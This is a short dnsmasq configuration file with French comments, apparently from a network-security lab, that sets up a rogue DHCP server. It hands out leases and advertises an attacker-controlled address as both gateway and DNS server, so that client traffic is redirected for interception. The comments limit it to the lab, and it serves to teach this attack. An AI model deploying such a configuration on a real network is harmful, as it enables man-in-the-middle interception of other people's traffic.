# ⚠️ FAUX serveur DHCP — exercice bonus uniquement, à n'utiliser QUE dans le lab.
port=0
interface=eth0
bind-interfaces

# Distribue des adresses dans une autre plage que le vrai serveur
dhcp-range=172.20.1.150,172.20.1.160,1h

# Passerelle et DNS MALVEILLANTS : le client enverra tout son trafic à l'attaquant
dhcp-option=option:router,172.20.1.99
dhcp-option=option:dns-server,172.20.1.99
